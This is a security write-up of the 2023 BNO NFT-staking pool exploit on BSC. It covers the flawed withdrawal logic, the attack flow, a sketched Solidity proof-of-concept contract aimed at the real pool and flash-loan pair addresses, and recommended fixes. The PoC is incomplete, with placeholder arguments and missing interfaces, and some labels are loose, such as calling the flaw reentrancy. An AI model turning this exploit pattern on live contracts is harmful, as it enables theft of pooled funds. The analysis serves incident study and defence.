# BNO Flash Loan Reentrancy Incident Analysis

## 1. Overview

| Field | Details |
|------|------|
| Project | BNO |
| Date | 2023-07-01 |
| Chain | BSC (Binance Smart Chain) |
| Loss | ~$505,000 USD |
| Attack Type | Flash Loan + Reentrancy |
| CWE | CWE-841 (Improper Enforcement of Behavioral Workflow) |
| Attacker Address | `0xA6566574eDC60D7B2AdbacEdB71D5142cf2677fB` |
| Attack Contract | `0xD138b9a58D3e5f4be1CD5eC90B66310e241C13CD` |
| Vulnerable Contract | `0xdCA503449899d5649D32175a255A8835A03E4006` (Pool) |
| Fork Block | 30,056,629 |

## 2. Vulnerability Code Analysis

The BNO Pool's `emergencyWithdraw()` function allowed rewards to be withdrawn without unstaking NFTs. The attacker repeatedly cycled through `pledge()`, `emergencyWithdraw()`, and `unstakeNft()` after staking an NFT to claim duplicate rewards.

```solidity
// Vulnerable pattern: emergencyWithdraw does not require NFT unstaking
function emergencyWithdraw() external {
    UserInfo storage user = userInfo[msg.sender];
    uint256 amount = user.amount;

    // Vulnerable: withdrawal without checking NFT stake status
    // No validation of user.nftStaked
    user.amount = 0;
    user.rewardDebt = 0;

    // Token transfer (reentrancy possible)
    IERC20(rewardToken).transfer(msg.sender, amount);
}

function pledge(uint256 amount) external {
    // Callable even without an NFT staked
    UserInfo storage user = userInfo[msg.sender];
    user.amount += amount;
    // reward update
}
```

**Vulnerability**: `emergencyWithdraw()` does not require NFT unstaking, allowing rewards to be claimed repeatedly while retaining the NFT.

### On-Chain Source Code

Source: Bytecode decompilation

```solidity
// Root cause: Flash Loan + Reentrancy
// Source code unverified — based on bytecode analysis
```

## 3. Attack Flow

```
Attacker [0xA6566574eDC60D7B2AdbacEdB71D5142cf2677fB]
  │
  ├─1─▶ PancakePair.swap() [0x4B9c234779A3332b74DBaFf57559EC5b4cB078BD] flash loan
  │      └─▶ pancakeCall() callback
  │
  ├─2─▶ Loop execution (repeated):
  │      ├─▶ Pool.stakeNft(nftId) [0xdCA503449899d5649D32175a255A8835A03E4006]
  │      ├─▶ Pool.pledge(amount)
  │      ├─▶ Pool.emergencyWithdraw() → claim rewards
  │      └─▶ Pool.unstakeNft(nftId)
  │
  ├─3─▶ BNO token [0xa4dBc813F7E1bf5827859e278594B1E0Ec1F710F] drained in bulk
  │
  └─4─▶ Repay PancakePair flash loan + realize profit
```

## 4. PoC Core Code

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

interface IPool {
    function stakeNft(uint256 tokenId) external;
    function unstakeNft(uint256 tokenId) external;
    function pledge(uint256 amount) external;
    function emergencyWithdraw() external;
}

interface IERC721 {
    function safeTransferFrom(address from, address to, uint256 tokenId) external;
    function ownerOf(uint256 tokenId) external view returns (address);
}

contract BNOExploit {
    IPool Pool = IPool(0xdCA503449899d5649D32175a255A8835A03E4006);
    IERC721 NFT = IERC721(0x8EE0C2709a34E9FDa43f2bD5179FA4c112bEd89A);
    IERC20 BNO = IERC20(0xa4dBc813F7E1bf5827859e278594B1E0Ec1F710F);
    IPancakePair PancakePair = IPancakePair(0x4B9c234779A3332b74DBaFf57559EC5b4cB078BD);

    function testExploit() external {
        PancakePair.swap(505_000e18, 0, address(this), abi.encode("exploit"));
    }

    function pancakeCall(address, uint256 amount0, uint256, bytes calldata) external {
        // Repeated stake/pledge/emergencyWithdraw/unstake
        for (uint256 i = 0; i < 50; i++) {
            Pool.stakeNft(/* nftId */);
            Pool.pledge(amount0 / 50);
            Pool.emergencyWithdraw();
            Pool.unstakeNft(/* nftId */);
        }

        // Repay flash loan
        BNO.transfer(address(PancakePair), amount0 * 1003 / 1000);
    }
}
```

## 5. Vulnerability Classification

| Field | Details |
|------|------|
| CWE | CWE-841 (Improper Enforcement of Behavioral Workflow) |
| Vulnerability Type | Reentrancy, emergencyWithdraw logic flaw |
| Impact Scope | Full BNO Pool liquidity |
| Explorer | [BSCscan](https://bscscan.com/address/0xdCA503449899d5649D32175a255A8835A03E4006) |

## 6. Security Recommendations

```solidity
// Fix 1: Check NFT stake status in emergencyWithdraw
function emergencyWithdraw() external nonReentrant {
    UserInfo storage user = userInfo[msg.sender];

    // Require NFT to be unstaked first
    require(user.nftTokenId == 0, "Must unstake NFT first");

    uint256 amount = user.amount;
    user.amount = 0;
    user.rewardDebt = 0;

    IERC20(rewardToken).transfer(msg.sender, amount);
    emit EmergencyWithdraw(msg.sender, amount);
}

// Fix 2: Add cooldown to pledge/unpledge
mapping(address => uint256) public lastPledgeTime;
uint256 constant PLEDGE_COOLDOWN = 1 days;

function pledge(uint256 amount) external {
    require(block.timestamp >= lastPledgeTime[msg.sender] + PLEDGE_COOLDOWN, "Cooldown active");
    lastPledgeTime[msg.sender] = block.timestamp;
    // ...
}

// Fix 3: Flash loan prevention (disallow stake/unstake in the same block)
mapping(address => uint256) public lastStakeBlock;

function stakeNft(uint256 tokenId) external {
    lastStakeBlock[msg.sender] = block.number;
    // ...
}

function unstakeNft(uint256 tokenId) external {
    require(block.number > lastStakeBlock[msg.sender], "Cannot unstake in same block");
    // ...
}
```

## 7. Lessons Learned

1. **Validate emergency withdrawal functions**: `emergencyWithdraw()` requires the same state validation as normal withdrawals. The "emergency" label does not justify bypassing validation.
2. **Couple NFT and token staking state**: When NFT staking and token staking are linked, neither side should be manipulable without first releasing the other.
3. **Same-block restrictions**: To prevent flash loan-based attacks, staking and unstaking must be prohibited within the same block.
4. **BSC NFT staking protocols**: Similar vulnerability patterns have recurred across multiple BSC NFT staking protocols, highlighting the need for a standardized audit checklist.